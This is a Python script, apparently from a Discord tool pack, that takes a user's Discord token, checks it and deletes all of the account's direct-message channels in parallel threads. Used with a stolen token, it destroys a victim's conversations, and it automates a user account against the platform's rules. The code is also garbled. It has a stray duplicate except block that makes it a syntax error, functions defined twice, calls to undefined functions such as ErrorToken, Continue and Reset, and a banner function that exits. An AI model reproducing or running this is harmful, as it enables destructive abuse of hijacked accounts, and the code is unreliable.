try:
    import requests
    import sys
    import time
    from itertools import cycle
    import random
    import json
    import threading
    from datetime import datetime  
except ImportError as e:
    print(f"Error importing modules: {e}")
    sys.exit(1)


except ImportError as e:
    print(f"Error importing modules: {e}")
    sys.exit(1)

def current_time_hour():
    return datetime.now().strftime("%H:%M:%S")

BEFORE = "["
AFTER = "]"
INPUT = ">"
reset = "\033[0m"
BEFORE_GREEN = "\033[92m["
AFTER_GREEN = "]"
GEN_VALID = "✅"
GEN_INVALID = "❌"
red = "\033[91m"
white = "\033[97m"
color = {"GREEN": "\033[92m"}
ERROR = "❌"
ADD = "✅"
INFO = "ℹ️"



def current_time_hour():
    return datetime.now().strftime("%H:%M:%S")

def CheckWebhook(url):
    return url.startswith("https://discord.com/api/webhooks/")

def Error(e):
    print(f"An error occurred: {e}")
    sys.exit(1)

def ErrorNumber():
    print("Invalid number of threads. Please enter a valid number.")
    sys.exit(1)

def ErrorWebhook():
    print("Invalid webhook URL. Please check and try again.")
    sys.exit(1)

def discord_banner():
    print("406 lpb")
    sys.exit(1)

def Choice1TokenDiscord():
    return input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Enter Discord Token -> {reset}")
   
Title=("Discord Token Delete Dm")

try:
    Slow=(discord_banner)
    token = Choice1TokenDiscord()
    r = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
    if r.status_code == 200:
        pass
    else:
        ErrorToken()

    def DmDeleter(token, channels):
        for channel in channels:
            try:
                requests.delete(f'https://discord.com/api/v7/channels/'+channel['id'], headers={'Authorization': token})
                print(f"{BEFORE + current_time_hour() + AFTER} {ADD} Status: {white}Delete{red} | Channel: {white}{channel['id']}")
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Status: {white}Error: {e}{red}")

    processes = []
    channel_id = requests.get("https://discord.com/api/v9/users/@me/channels", headers={'Authorization': token}).json()
    if not channel_id:
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} No dm found.")
        Continue()
        Reset()

    for channel in [channel_id[i:i+3] for i in range(0, len(channel_id), 3)]:
            t = threading.Thread(target=DmDeleter, args=(token, channel))
            t.start()
            processes.append(t)
    for process in processes:
        process.join()
    Continue()
    Reset()
except Exception as e:
    Error(e)